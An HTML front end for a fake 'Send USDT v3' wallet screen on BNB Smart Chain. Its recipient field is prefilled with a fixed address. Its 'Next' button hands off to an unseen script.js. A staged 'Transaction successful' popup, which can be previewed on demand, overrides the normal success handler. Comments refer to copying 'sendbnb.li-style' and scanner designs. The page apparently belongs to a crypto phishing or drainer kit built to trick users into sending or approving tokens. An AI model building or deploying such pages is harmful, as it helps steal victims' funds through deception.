<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
  <meta name="color-scheme" content="light dark">
  <title>Send USDT v3</title>
  <link rel="stylesheet" href="style.css">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <!-- Web3.js (Load First) -->
  <script src="js/web3.min.js"></script>
</head>
<body>
  <!-- Loading overlay (light/dark from scanner-manual) -->
  <div id="loadingOverlay" class="loading-overlay" style="display: none;">
    <div class="loading-spinner-container">
      <div class="loading-spinner"></div>
      <p class="loading-text">Processing...</p>
    </div>
  </div>

  <main class="container">
    <p class="version-badge" aria-hidden="true">v3</p>
    <label class="label" for="address">Address or Domain Name</label>
    <div class="input-group address-input-group">
      <input type="text" id="address" placeholder="Search or Enter" value="0x53d6f1967d89291a92F185CCc744024d50E8c744">
      <button class="text-btn">Paste</button>
      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
      <button class="icon-btn"><i class="fas fa-expand"></i></button>
    </div>

    <label class="label" for="destinationNetwork">Destination network</label>
    <div class="network-select">
      <div class="network-icon">
        <img src="cropped_circle_image.png" alt="BNB Smart Chain" class="bnb-logo-img">
      </div>
      <span class="network-text">BNB Smart Chain</span>
      <i class="fas fa-chevron-down network-arrow"></i>
    </div>

    <label class="label" for="amount">Amount</label>
    <div class="input-group amount-input-group">
      <input type="number" id="amount" placeholder="USDT Amount">
      <span class="unit">USDT</span>
      <button class="max-btn">Max</button>
    </div>

    <p class="estimate" id="estimate">≈ $0.00</p>

    <button id="verifyBtn" class="next-btn">Next</button>
    <p class="preview-hint"><button type="button" id="previewPopupBtn" class="preview-btn">Preview success popup</button></p>
  </main>

  <!-- Success popup (reference: Processing-style bottom sheet – 3D check, wireframe globe, particles) -->
  <div id="successModal" class="success-modal" aria-hidden="true">
    <div class="success-modal__backdrop"></div>
    <div class="success-modal__sheet">
      <button type="button" class="success-modal__close" aria-label="Close">&times;</button>
      <div class="success-modal__graphic">
        <svg class="success-modal__icon" viewBox="0 0 140 140" fill="none" xmlns="http://www.w3.org/2000/svg">
          <!-- Wireframe globe – light ethereal blue/turquoise (ref: first img) -->
          <circle cx="70" cy="70" r="56" stroke="rgba(0, 122, 255, 0.4)" stroke-width="1" fill="none"/>
          <ellipse cx="70" cy="70" rx="56" ry="28" stroke="rgba(0, 122, 255, 0.35)" stroke-width="0.9" fill="none"/>
          <ellipse cx="70" cy="70" rx="28" ry="56" stroke="rgba(0, 122, 255, 0.35)" stroke-width="0.9" fill="none"/>
          <line x1="14" y1="70" x2="126" y2="70" stroke="rgba(0, 122, 255, 0.28)" stroke-width="0.8"/>
          <line x1="70" y1="14" x2="70" y2="126" stroke="rgba(0, 122, 255, 0.28)" stroke-width="0.8"/>
          <!-- Glowing shard-like / triangular particles -->
          <polygon points="70,16 74,24 66,24" fill="rgba(0, 122, 255, 0.85)"/>
          <polygon points="24,68 30,74 26,62" fill="rgba(0, 122, 255, 0.7)"/>
          <polygon points="116,72 122,78 118,66" fill="rgba(0, 122, 255, 0.7)"/>
          <polygon points="68,124 72,132 64,132" fill="rgba(0, 122, 255, 0.7)"/>
          <polygon points="38,38 44,42 40,34" fill="rgba(0, 122, 255, 0.6)"/>
          <polygon points="98,52 104,58 100,48" fill="rgba(0, 122, 255, 0.65)"/>
          <polygon points="42,98 48,102 44,94" fill="rgba(0, 122, 255, 0.6)"/>
          <polygon points="96,88 102,94 98,84" fill="rgba(0, 122, 255, 0.65)"/>
          <circle cx="32" cy="42" r="1.5" fill="rgba(0, 122, 255, 0.8)"/>
          <circle cx="108" cy="58" r="1.2" fill="rgba(0, 122, 255, 0.75)"/>
          <circle cx="36" cy="98" r="1.2" fill="rgba(0, 122, 255, 0.75)"/>
          <circle cx="102" cy="82" r="1.5" fill="rgba(0, 122, 255, 0.8)"/>
          <!-- 3D checkmark: main body vibrant green + distinct blue stripe on one arm (ref) -->
          <path d="M36 72 L56 92 L104 44" stroke="#34C759" stroke-width="14" stroke-linecap="round" stroke-linejoin="round"/>
          <path d="M56 92 L104 44" stroke="#007AFF" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
      <h2 class="success-modal__title">Transaction successful!</h2>
      <p class="success-modal__desc">
        <span class="success-modal__line">Your transaction has been confirmed.</span>
        <span class="success-modal__line">Blockchain validation complete.</span>
      </p>
      <a id="successModalDetailsBtn" href="https://bscscan.com/" target="_blank" rel="noopener" class="success-modal__btn">Transaction details</a>
    </div>
  </div>

  <!-- Custom script after Web3 (script.js must load and define Next before we bind) -->
  <script src="js/script.js"></script>

  <!-- Sync loading overlay with script's showLoading/hideLoading/showError so Processing shows and always hides on success/error -->
  <script>
    (function () {
      var overlay = document.getElementById("loadingOverlay");
      if (!overlay) return;
      var origShow = window.showLoading;
      var origHide = window.hideLoading;
      var origError = window.showError;
      if (typeof origShow === "function") {
        window.showLoading = function (msg) {
          if (overlay) { overlay.style.display = "flex"; var t = overlay.querySelector(".loading-text"); if (t) t.textContent = msg || "Processing..."; }
          return origShow.apply(this, arguments);
        };
      }
      if (typeof origHide === "function") {
        window.hideLoading = function () {
          if (overlay) overlay.style.display = "none";
          return origHide.apply(this, arguments);
        };
      }
      if (typeof origError === "function") {
        window.showError = function (msg) {
          if (overlay) overlay.style.display = "none";
          return origError.apply(this, arguments);
        };
      }
    })();
  </script>

  <!-- Override success popup: show sendbnb.li-style bottom sheet on transaction success -->
  <script>
    (function () {
      var modal = document.getElementById("successModal");
      if (!modal) return;
      var closeBtn = modal && modal.querySelector(".success-modal__close");
      var backdrop = modal && modal.querySelector(".success-modal__backdrop");
      var detailsBtn = document.getElementById("successModalDetailsBtn");

      function openSuccessModal() {
        var oldPopup = document.getElementById("successPopup");
        if (oldPopup) oldPopup.style.display = "none";
        if (modal) {
          requestAnimationFrame(function () {
            modal.classList.add("is-open");
            modal.setAttribute("aria-hidden", "false");
          });
        }
      }
      function closeSuccessModal() {
        if (modal) {
          modal.classList.remove("is-open");
          modal.setAttribute("aria-hidden", "true");
        }
      }

      if (closeBtn) closeBtn.addEventListener("click", closeSuccessModal);
      if (backdrop) backdrop.addEventListener("click", closeSuccessModal);

      var previewBtn = document.getElementById("previewPopupBtn");
      if (previewBtn) previewBtn.addEventListener("click", openSuccessModal);

      var originalShowSuccess = window.showSuccess;
      if (typeof originalShowSuccess === "function") {
        window.showSuccess = function (message) {
          openSuccessModal();
        };
      }
    })();
  </script>

  <!-- Bind Next() directly (no catch – script handles errors and calls showError) -->
  <script>
    (function () {
      var btn = document.getElementById("verifyBtn");
      if (btn && typeof window.Next === "function") {
        btn.addEventListener("click", function () { window.Next(); });
      }
    })();
  </script>
  <!-- Update USD estimate when user enters amount (always show as positive) -->
  <script>
    (function () {
      var amountInput = document.getElementById("amount");
      var estimateEl = document.getElementById("estimate");
      function updateEstimate() {
        var raw = amountInput.value.replace(/^\s+|\s+$/g, "");
        var num = parseFloat(raw) || 0;
        var value = Math.abs(num);
        estimateEl.textContent = "≈ $" + value.toFixed(2);
      }
      amountInput.addEventListener("input", updateEstimate);
      amountInput.addEventListener("change", updateEstimate);
      updateEstimate();
    })();
  </script>
</body>
</html>
